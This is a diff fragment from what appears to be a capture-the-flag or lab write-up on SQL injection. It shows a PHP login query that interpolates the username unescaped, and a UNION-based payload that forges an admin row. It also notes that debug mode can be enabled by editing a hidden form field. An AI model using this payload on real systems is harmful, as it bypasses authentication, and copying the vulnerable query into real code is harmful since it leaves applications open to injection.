@@ -65,8 +65,11 @@ of what we normally do - add the condition ```AND 1=0``` which always returns fa
 
 The original query is 
 ```$query = "SELECT * FROM users WHERE username='$username'"```
+
 and we can attach the following string:
+
 ```' AND 1=0 UNION SELECT 'admin' AS username, 'password' AS password, 1337 AS user_level #``` 
+
 (```#``` can be replaced by ```-- ```. Note the a space that follows!).
 
 With the debug mode turned on (turn on by editing the ```hidden``` input field in HTML), it gives the following error message:
